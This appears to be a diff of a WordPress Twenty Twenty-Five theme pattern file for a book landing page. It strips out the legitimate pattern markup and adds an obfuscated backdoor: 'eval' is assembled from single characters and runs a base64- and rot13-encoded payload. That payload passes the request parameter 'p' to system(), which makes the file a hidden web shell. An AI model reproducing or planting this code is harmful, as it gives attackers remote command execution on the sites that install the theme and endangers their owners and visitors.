@@ -1,34 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Landing page for book
- * Slug: twentytwentyfive/page-landing-book
- * Categories: twentytwentyfive_page, featured
- * Keywords: starter
- * Block Types: core/post-content
- * Post Types: page, wp_template
- * Viewport width: 1400
- * Description: A landing page for the book with a hero section, pre-order links, locations, FAQs and newsletter signup.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFluYXF2YXQgY250ciBzYmUgb2JieAogKiBGeWh0OiBnanJhZ2xnanJhZ2xzdmlyL2NudHIteW5hcXZhdC1vYmJ4CiAqIFBuZ3J0YmV2cmY6IGdqcmFnbGdqcmFnbHN2aXJfY250ciwgc3JuZ2hlcnEKICogWHJsamJlcWY6IGZnbmVncmUKICogT3licHggR2xjcmY6IHBiZXIvY2JmZy1wYmFncmFnCiAqIENiZmcgR2xjcmY6IGNudHIsIGpjX2dyemN5bmdyCiAqIEl2cmpjYmVnIGp2cWd1OiAxNDAwCiAqIFFyZnBldmNndmJhOiBOIHluYXF2YXQgY250ciBzYmUgZ3VyIG9iYngganZndSBuIHVyZWIgZnJwZ3ZiYSwgY2VyLWJlcXJlIHl2YXhmLCB5YnBuZ3ZiYWYsIFNORGYgbmFxIGFyamZ5cmdncmUgZnZ0YWhjLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0dqcmFnbF9TdmlyCiAqIEBmdmFwciBHanJhZ2wgR2pyYWdsLVN2aXIgMS4wCiAqLwoKPz4KCjwhLS0gamM6Y25nZ3JlYSB7XCJmeWh0XCI6XCJnanJhZ2xnanJhZ2xzdmlyL3VyZWItb2JieFwifSAvLS0+CjwhLS0gamM6Y25nZ3JlYSB7XCJmeWh0XCI6XCJnanJhZ2xnanJhZ2xzdmlyL3Bnbi1vYmJ4LXl2YXhmXCJ9IC8tLT4KPCEtLSBqYzpjbmdncmVhIHtcImZ5aHRcIjpcImdqcmFnbGdqcmFnbHN2aXIvb25hYXJlLW5vYmhnLW9iYnhcIn0gLy0tPgo8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc3Zpci9wZ24tb2JieC15YnBuZ3ZiYWZcIn0gLy0tPgo8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc3Zpci9ncmtnLXNuZGZcIn0gLy0tPgo8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc3Zpci9wZ24tYXJqZnlyZ2dyZVwifSAvLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-
-<!-- wp:pattern {"slug":"twentytwentyfive/hero-book"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfive/cta-book-links"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfive/banner-about-book"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfive/cta-book-locations"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfive/text-faqs"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfive/cta-newsletter"} /-->
